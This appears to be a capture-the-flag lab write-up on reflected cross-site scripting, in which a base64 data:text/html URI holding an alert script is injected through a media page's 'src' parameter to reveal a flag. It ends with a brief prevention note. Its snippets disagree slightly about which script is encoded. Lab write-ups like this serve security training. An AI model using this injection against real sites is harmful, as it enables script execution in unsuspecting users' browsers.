# 04_XSS_basic

## Method

Go to <http://192.168.1.102/>
Inpect the blue National Security Agency logo  
It is a link containing media, the source is not protected

## Manipulation

We can insert an encoded script in the link

```

kmatjeke% echo -n '<script>alert(1)</script>' | base64
PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

```

That's how you get an encoded hash value of the simple `alert("Hello World")` script.

Insert this hash into the `src` attribute

```

href="?page=media&src=PHNjcmlwdD5hbGVydCgiSGVsbG8gV29ybGQiKTwvc2NyaXB0Pg=="

```

```

data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

```

The full url is:

```

http://192.168.1.102/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

```

When we search that in the browser we get the flag
Which is:   928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D

## Prevension

There is no need to get images from the url rather store the src in the actual
src attribute of the image itself. If data is needed from the DB request backend
on page load through a post request.
